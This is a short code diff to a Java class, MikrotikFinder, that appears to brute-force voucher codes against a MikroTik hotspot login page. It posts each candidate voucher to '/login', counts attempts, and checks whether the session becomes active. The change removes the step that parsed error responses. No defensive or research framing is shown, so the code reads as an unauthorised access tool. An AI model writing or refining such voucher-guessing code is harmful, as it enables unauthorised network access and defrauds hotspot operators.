@@ -196,16 +196,8 @@ public class MikrotikFinder {
         boolean beforeActive = statusActive(beforeJson);
 
         String body = buildFormBody(formTemplate, voucher);
-        String postResp = httpPost(base + "/login", body, session, 6000);
+        httpPost(base + "/login", body, session, 6000);
         totalAttempts.incrementAndGet();
-
-        if (postResp != null) {
-            String lr = postResp.toLowerCase();
-            if (lr.contains("already authorizing") || lr.contains("invalid") ||
-                lr.contains("error") || lr.contains("wrong") || lr.contains("denied")) {
-                return false;
-            }
-        }
 
         long[] checks = {150, 150, 200, 300};
         for (long d : checks) {
